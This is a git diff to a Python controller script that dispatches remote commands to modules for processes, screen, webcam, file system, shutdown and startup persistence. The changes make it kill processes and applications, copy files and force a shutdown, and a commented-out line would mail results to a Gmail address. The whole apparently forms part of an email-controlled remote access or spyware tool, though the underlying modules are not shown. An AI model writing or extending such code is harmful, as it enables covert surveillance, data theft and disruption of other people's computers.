@@ -1,5 +1,6 @@
 
 import os
+from src.application import Application
 from src.process import Process
 from src.screen import Screen
 from src.webcam import Webcam
@@ -54,6 +55,8 @@ class Main:
             self.restart()
         elif sj == "runFromStartup":
             self.runFromStartup()
+        elif sj == "application":
+            self.application()
         elif sj == "close":
             self.close()
         else:
@@ -62,7 +65,8 @@ class Main:
 
     def process(self):
         doit = Process()
-        processes = doit.run(code='view')
+        processes = doit.run(code='kill')
+        print(processes)
         # self.s.send_mail("receiverimap002@gmail.com", 'process', processes)
 
     def screen(self):
@@ -85,15 +89,21 @@ class Main:
 
     def fileSystem(self):
         doit = FileSystem()
-        tree = doit.getTree()
+        # tree = doit.getTree()
+        doit.run(code='copy')
         # sent tree
 
     def shutdown(self):
         # send message 'shutdown, complete!'
-        os.popen("shutdown -s -t 10")
+        os.popen("shutdown /s")
 
     def runFromStartup(self):
         print('--registry?--')
+
+    def application(self):
+        doit = Application()
+        apps = doit.run(code='kill')
+        print(apps)
 
     def restart(self):
         # send message 'restart, complete!'
@@ -105,6 +115,7 @@ class Main:
         # self.r.quit()
 
 app = Main()
-while app.run:
-    app.open()
+app.open()
+# while app.run:
+#     app.open()
 
